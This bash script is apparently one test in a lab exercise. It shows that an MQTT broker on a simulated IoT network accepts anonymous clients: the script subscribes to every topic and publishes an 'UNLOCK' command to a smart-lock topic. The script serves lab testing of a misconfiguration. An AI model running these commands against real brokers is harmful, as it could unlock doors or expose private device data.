#!/bin/bash
# Test 8/9: Unauthenticated MQTT pub/sub abuse against the broker on IoT-Sim.
# Run from Kali-Attacker. Requires mosquitto-clients:
#   sudo apt install -y mosquitto-clients
#
# Demonstrates the broker has zero access control: any client can subscribe
# to every topic and publish to any topic without credentials.

TARGET="192.168.30.20"

echo "Subscribing to all topics in the background..."
mosquitto_sub -h "$TARGET" -t '#' -v &
SUB_PID=$!
sleep 1

echo "Publishing an unauthenticated message to a plausible smart-lock topic..."
mosquitto_pub -h "$TARGET" -t 'home/frontdoor/lock' -m 'UNLOCK'

sleep 2
kill "$SUB_PID" 2>/dev/null

echo "If the subscriber printed the published message above, the broker"
echo "accepted an unauthenticated publish/subscribe round-trip."
